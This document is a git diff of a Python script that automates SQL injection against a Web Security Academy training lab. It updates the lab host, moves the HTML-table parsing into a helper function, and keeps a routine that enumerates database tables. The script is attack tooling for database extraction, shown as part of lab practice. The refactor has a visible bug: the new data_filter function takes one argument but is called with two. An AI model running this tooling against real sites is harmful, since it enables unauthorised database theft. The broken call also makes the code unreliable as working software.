@@ -6,7 +6,7 @@ import requests
 import signal
 
 # Global vars 
-host= 'ac681f4e1e5696a6807401b1006f0017.web-security-academy.net' 
+host= 'ac2a1f861fb1fc5080dc1b9700460076.web-security-academy.net' 
 url = 'https://{0}/filter'.format(host)
 
 
@@ -28,21 +28,27 @@ def sqli_requests(sqli):
         
         r = requests.get(url, params=payload, headers=header)
         
-        data_filter = re.findall(r'(?:<tbody>)([\s\S]*)(?:<\/tbody>)', r.text)
-        data_filter = re.findall(r'(?<=>)(.*?)(?=<\/)', data_filter[0])
-        
-        if re.search(r'<p>Solved</p>', r.text):
-            print ('Congratulations, you solved the lab!')
-        
-        print(r.url)
-            
-        return data_filter
-    
+        data = data_filter(r.text,r.url)
+
+        return data
+
     except: 
         print(r.url)
         print("Unexpected error:", sys.exc_info()[0])
         print ("Web content: ")
         return r.text
+
+
+
+def data_filter(text):        
+        data_filter = re.findall(r'(?:<tbody>)([\s\S]*)(?:<\/tbody>)', text)
+        data_filter = re.findall(r'(?<=>)(.*?)(?=<\/)', data_filter[0])
+        
+        if re.search(r'<p>Solved</p>', text):
+            print ('Congratulations, you solved the lab!')
+        
+        return data_filter
+    
 
 
 def enum_tables(db_name):
@@ -64,6 +70,8 @@ def enum_tables(db_name):
     return info_table
 
 
+
+
 def main():
 
     while True:
@@ -78,9 +86,6 @@ def main():
                         f.write(name)
                         enum_tables(name)
                 f.close()
-            elif option == 'blind':
-                data = blind_sqli(sqli)
-                print(data)
             else:
                 print(data)
         else:
